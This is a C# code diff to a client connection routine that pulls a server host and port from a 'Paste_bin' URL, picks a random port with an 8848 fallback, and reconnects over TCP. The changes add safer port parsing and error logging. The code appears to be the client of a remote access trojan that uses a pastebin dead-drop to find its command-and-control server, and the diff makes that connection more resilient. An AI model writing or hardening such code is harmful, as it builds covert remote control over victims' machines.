@@ -14,6 +14,7 @@ using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
+using Client.Helper;
 
 namespace Client.Connection
 {
@@ -67,7 +68,8 @@ namespace Client.Connection
                     }
                     foreach (string port in ports)
                     {
-                        connectionResilience.AddPort(Convert.ToInt32(port.Trim()));
+                        if (int.TryParse(port.Trim(), out int portNum))
+                            connectionResilience.AddPort(portNum);
                     }
 
                     // Get next target from ConnectionResilience
@@ -85,7 +87,10 @@ namespace Client.Connection
                         string resp = wc.DownloadString(Settings.Paste_bin);
                         string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                         targetHost = spl[0];
-                        targetPort = Convert.ToInt32(spl[new Random().Next(1, spl.Length)]);
+                        if (spl.Length > 1 && int.TryParse(spl[new Random().Next(1, spl.Length)], out int pbPort))
+                            targetPort = pbPort;
+                        else
+                            targetPort = 8848; // fallback
                     }
                 }
 
@@ -175,7 +180,10 @@ namespace Client.Connection
                 TcpClient?.Dispose();
                 transportManager?.Disconnect();
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Logger.Error("ClientSocket Reconnect error", ex);
+            }
             IsConnected = false;
         }
 
